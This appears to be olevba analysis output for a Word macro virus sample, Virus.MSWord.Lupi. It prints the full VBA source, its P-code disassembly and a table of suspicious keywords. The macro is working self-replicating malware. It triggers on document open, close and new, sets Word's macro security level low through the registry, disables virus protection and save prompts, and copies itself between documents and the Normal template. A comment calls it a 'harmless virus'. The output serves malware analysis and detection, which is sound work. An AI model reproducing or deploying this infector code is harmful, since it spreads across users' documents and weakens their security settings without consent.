olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lupi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lupi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

'CISI-LUPI v1.02.002

Const virusIDRow = 3

Private Sub Cisi_Lupi()

'Destroy Virus with Virus...
'this is harmless virus
'code created by syarifl@bigfoot.com

'program kecil ini akan mengaktifkan Window VBA, agar
'anda langsung dapat melihat intruder yang masuk ke dalam VBA
'anda. Saya sudah coba dan terbukti sangat efektif untuk user
'dengan tingkat kemahiran menengah.

'On Error Resume Next

  Dim regs
  regs = "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
  If System.PrivateProfileString("", regs, "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", regs, "Level") = 1&
  Else
    'CommandBars("Tools").Controls("Macro").Enabled = False
    With Options
      .VirusProtection = False
      .ConfirmConversions = False
      .SaveNormalPrompt = False
    End With
  End If
  Dim adcp, adver
  Dim ntcp, ntver
  Set adcp = ActiveDocument.VBProject.VBComponents(1)
  Set ntcp = NormalTemplate.VBProject.VBComponents(1)
  adver = ProcessVersion(adcp.CodeModule.Lines(virusIDRow, 1))
  ntver = ProcessVersion(ntcp.CodeModule.Lines(virusIDRow, 1))
  Dim adln, ntln
  adln = adcp.CodeModule.CountOfLines
  ntln = adcp.CodeModule.CountOfLines
  Dim src
  Dim dst
  Dim ExitNow
  ExitNow = True
  If ntver > adver Then
    Set src = ntcp
    Set dst = adcp
    ExitNow = False
  ElseIf adver > ntver Then
    Set src = adcp
    Set dst = ntcp
    ExitNow = False
  End If
  If ExitNow Then Exit Sub
  Dim i
  For i = dst.CodeModule.CountOfLines To 1 Step -1
    dst.CodeModule.DeleteLines i, 1
  Next i
  For i = 1 To src.CodeModule.CountOfLines
    dst.CodeModule.InsertLines i, src.CodeModule.Lines(i, 1)
  Next i
  If (ntln <> 0) And (adln = 0) And (InStr(1, ActiveDocument.Name, "Document") = 0) Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
  ElseIf (InStr(1, ActiveDocument.Name, "Document") <> 0) Then
    ActiveDocument.Saved = True
  End If
End Sub

Private Function ProcessVersion(ver) As Long
On Error GoTo ProcessVersion_Err
  ver = Trim(ver)
  If ver = "" Then GoTo ProcessVersion_Err
  ver = Right(ver, 8)
  Dim x As Long
  x = Left(ver, 1) * 100000
  x = x + Mid(ver, 3, 2) * 1000
  x = x + Right(ver, 3)
  ProcessVersion = x
  Exit Function
ProcessVersion_Err:
  ProcessVersion = 0
End Function

Private Sub MyMsgBox(Prompt)
  Exit Sub
  VBA.MsgBox Prompt, vbOKOnly, "CISI-LUPI (" & Me.Name & ")"
End Sub

Private Sub Document_Open()
  MyMsgBox "Document_Open"
  VBE.MainWindow.Visible = True
  Call Cisi_Lupi
End Sub

Private Sub Document_Close()
  MyMsgBox "Document_Close"
  'VBE.MainWindow.SetFocus
  Call Cisi_Lupi
End Sub

Private Sub Document_New()
  MyMsgBox "Document_New"
  'VBE.MainWindow.SetFocus
  Call Cisi_Lupi
End Sub

Private Sub ViewVbCode()
  MyMsgBox "VBE Setfocus"
  VBE.MainWindow.SetFocus
End Sub

Private Sub Resetter()
On Error Resume Next
  Dim i%, j%
  For i = 1 To CommandBars.Count
    CommandBars(i).Reset
    For j = 1 To CommandBars(i).Controls.Count
      CommandBars(i).Controls(j).Reset
    Next j
  Next i
  CustomizationContext = NormalTemplate
  KeyBindings.ClearAll
End Sub

Private Sub cBars()
  Dim i%, j%
  For i = 1 To CommandBars.Count
    Selection.Font.Bold = True
    Selection.TypeText CommandBars(i).Name
    Selection.Font.Bold = False
    Selection.TypeParagraph
    For j = 1 To CommandBars(i).Controls.Count
      Selection.TypeText vbTab & CommandBars(i).Controls(j).Caption
      Selection.TypeParagraph
    Next j
  Next i
End Sub

Private Sub Tester()
  Dim x As Long
  x = ProcessVersion(virusID)
End Sub
     ActiveDocument.Saved = False) Then
     ActiveDocument.Saved = False) Then
     ActiveDocument.Saved = False) Then
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Lupi
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12888 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Line #2:
' 	QuoteRem 0x0000 0x0013 "CISI-LUPI v1.02.002"
' Line #3:
' Line #4:
' 	Dim (Const) 
' 	LitDI2 0x0003 
' 	VarDefn virusIDRow
' Line #5:
' Line #6:
' 	FuncDefn (Private Sub Cisi_Lupi())
' Line #7:
' Line #8:
' 	QuoteRem 0x0000 0x001B "Destroy Virus with Virus..."
' Line #9:
' 	QuoteRem 0x0000 0x0016 "this is harmless virus"
' Line #10:
' 	QuoteRem 0x0000 0x0023 "code created by syarifl@bigfoot.com"
' Line #11:
' Line #12:
' 	QuoteRem 0x0000 0x0034 "program kecil ini akan mengaktifkan Window VBA, agar"
' Line #13:
' 	QuoteRem 0x0000 0x003C "anda langsung dapat melihat intruder yang masuk ke dalam VBA"
' Line #14:
' 	QuoteRem 0x0000 0x003C "anda. Saya sudah coba dan terbukti sangat efektif untuk user"
' Line #15:
' 	QuoteRem 0x0000 0x0022 "dengan tingkat kemahiran menengah."
' Line #16:
' Line #17:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #18:
' Line #19:
' 	Dim 
' 	VarDefn regs
' Line #20:
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	St regs 
' Line #21:
' 	LitStr 0x0000 ""
' 	Ld regs 
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #22:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #23:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	Ld regs 
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #24:
' 	ElseBlock 
' Line #25:
' 	QuoteRem 0x0004 0x0036 "CommandBars("Tools").Controls("Macro").Enabled = False"
' Line #26:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #28:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #29:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #30:
' 	EndWith 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	Dim 
' 	VarDefn adcp
' 	VarDefn adver
' Line #33:
' 	Dim 
' 	VarDefn ntcp
' 	VarDefn ntver
' Line #34:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set adcp 
' Line #35:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set ntcp 
' Line #36:
' 	Ld virusIDRow 
' 	LitDI2 0x0001 
' 	Ld adcp 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd ProcessVersion 0x0001 
' 	St adver 
' Line #37:
' 	Ld virusIDRow 
' 	LitDI2 0x0001 
' 	Ld ntcp 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd ProcessVersion 0x0001 
' 	St ntver 
' Line #38:
' 	Dim 
' 	VarDefn adln
' 	VarDefn ntln
' Line #39:
' 	Ld adcp 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St adln 
' Line #40:
' 	Ld adcp 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ntln 
' Line #41:
' 	Dim 
' 	VarDefn src
' Line #42:
' 	Dim 
' 	VarDefn dst
' Line #43:
' 	Dim 
' 	VarDefn ExitNow
' Line #44:
' 	LitVarSpecial (True)
' 	St ExitNow 
' Line #45:
' 	Ld ntver 
' 	Ld adver 
' 	Gt 
' 	IfBlock 
' Line #46:
' 	SetStmt 
' 	Ld ntcp 
' 	Set src 
' Line #47:
' 	SetStmt 
' 	Ld adcp 
' 	Set dst 
' Line #48:
' 	LitVarSpecial (False)
' 	St ExitNow 
' Line #49:
' 	Ld adver 
' 	Ld ntver 
' 	Gt 
' 	ElseIfBlock 
' Line #50:
' 	SetStmt 
' 	Ld adcp 
' 	Set src 
' Line #51:
' 	SetStmt 
' 	Ld ntcp 
' 	Set dst 
' Line #52:
' 	LitVarSpecial (False)
' 	St ExitNow 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	Ld ExitNow 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #55:
' 	Dim 
' 	VarDefn i
' Line #56:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld dst 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #57:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld dst 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #58:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld src 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #60:
' 	Ld i 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld src 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld dst 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #61:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #62:
' 	Ld ntln 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	Ld adln 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #63:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #64:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #65:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	EndSub 
' Line #68:
' Line #69:
' 	FuncDefn (Private Function ProcessVersion(ver, id_FFFE As Long) As Long)
' Line #70:
' 	OnError ProcessVersion_Err 
' Line #71:
' 	Ld ver 
' 	ArgsLd Trim 0x0001 
' 	St ver 
' Line #72:
' 	Ld ver 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo ProcessVersion_Err 
' 	EndIf 
' Line #73:
' 	Ld ver 
' 	LitDI2 0x0008 
' 	ArgsLd Right 0x0002 
' 	St ver 
' Line #74:
' 	Dim 
' 	VarDefn x (As Long)
' Line #75:
' 	Ld ver 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitDI4 0x86A0 0x0001 
' 	Mul 
' 	St x 
' Line #76:
' 	Ld x 
' 	Ld ver 
' 	LitDI2 0x0003 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x03E8 
' 	Mul 
' 	Add 
' 	St x 
' Line #77:
' 	Ld x 
' 	Ld ver 
' 	LitDI2 0x0003 
' 	ArgsLd Right 0x0002 
' 	Add 
' 	St x 
' Line #78:
' 	Ld x 
' 	St ProcessVersion 
' Line #79:
' 	ExitFunc 
' Line #80:
' 	Label ProcessVersion_Err 
' Line #81:
' 	LitDI2 0x0000 
' 	St ProcessVersion 
' Line #82:
' 	EndFunc 
' Line #83:
' Line #84:
' 	FuncDefn (Private Sub MyMsgBox(Prompt))
' Line #85:
' 	ExitSub 
' Line #86:
' 	Ld Prompt 
' 	Ld vbOKOnly 
' 	LitStr 0x000B "CISI-LUPI ("
' 	Ld id_FFFF 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld VBA 
' 	ArgsMemCall MsgBox 0x0003 
' Line #87:
' 	EndSub 
' Line #88:
' Line #89:
' 	FuncDefn (Private Sub Document_Open())
' Line #90:
' 	LitStr 0x000D "Document_Open"
' 	ArgsCall MyMsgBox 0x0001 
' Line #91:
' 	LitVarSpecial (True)
' 	Ld VBE 
' 	MemLd MainWindow 
' 	MemSt Visible 
' Line #92:
' 	ArgsCall (Call) Cisi_Lupi 0x0000 
' Line #93:
' 	EndSub 
' Line #94:
' Line #95:
' 	FuncDefn (Private Sub Document_Close())
' Line #96:
' 	LitStr 0x000E "Document_Close"
' 	ArgsCall MyMsgBox 0x0001 
' Line #97:
' 	QuoteRem 0x0002 0x0017 "VBE.MainWindow.SetFocus"
' Line #98:
' 	ArgsCall (Call) Cisi_Lupi 0x0000 
' Line #99:
' 	EndSub 
' Line #100:
' Line #101:
' 	FuncDefn (Private Sub Document_New())
' Line #102:
' 	LitStr 0x000C "Document_New"
' 	ArgsCall MyMsgBox 0x0001 
' Line #103:
' 	QuoteRem 0x0002 0x0017 "VBE.MainWindow.SetFocus"
' Line #104:
' 	ArgsCall (Call) Cisi_Lupi 0x0000 
' Line #105:
' 	EndSub 
' Line #106:
' Line #107:
' 	FuncDefn (Private Sub ViewVbCode())
' Line #108:
' 	LitStr 0x000C "VBE Setfocus"
' 	ArgsCall MyMsgBox 0x0001 
' Line #109:
' 	Ld VBE 
' 	MemLd MainWindow 
' 	ArgsMemCall SetFocus 0x0000 
' Line #110:
' 	EndSub 
' Line #111:
' Line #112:
' 	FuncDefn (Private Sub Resetter())
' Line #113:
' 	OnError (Resume Next) 
' Line #114:
' 	Dim 
' 	VarDefn i
' 	VarDefn j
' Line #115:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld CommandBars 
' 	MemLd Count 
' 	For 
' Line #116:
' 	Ld i 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall Reset 0x0000 
' Line #117:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	MemLd Count 
' 	For 
' Line #118:
' 	Ld j 
' 	Ld i 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Reset 0x0000 
' Line #119:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #120:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #121:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #122:
' 	Ld KeyBindings 
' 	ArgsMemCall ClearAll 0x0000 
' Line #123:
' 	EndSub 
' Line #124:
' Line #125:
' 	FuncDefn (Private Sub cBars())
' Line #126:
' 	Dim 
' 	VarDefn i
' 	VarDefn j
' Line #127:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld CommandBars 
' 	MemLd Count 
' 	For 
' Line #128:
' 	LitVarSpecial (True)
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Bold 
' Line #129:
' 	Ld i 
' 	ArgsLd CommandBars 0x0001 
' 	MemLd New 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #130:
' 	LitVarSpecial (False)
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Bold 
' Line #131:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #132:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	MemLd Count 
' 	For 
' Line #133:
' 	Ld vbTab 
' 	Ld j 
' 	Ld i 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Caption 
' 	Concat 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #134:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #135:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #136:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #137:
' 	EndSub 
' Line #138:
' Line #139:
' 	FuncDefn (Private Sub Tester())
' Line #140:
' 	Dim 
' 	VarDefn x (As Long)
' Line #141:
' 	Ld virusID 
' 	ArgsLd ProcessVersion 0x0001 
' 	St x 
' Line #142:
' 	EndSub 
' Line #143:
' 	Reparse 0x0027 "     ActiveDocument.Saved = False) Then"
' Line #144:
' 	Reparse 0x0027 "     ActiveDocument.Saved = False) Then"
' Line #145:
' 	Reparse 0x0027 "     ActiveDocument.Saved = False) Then"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

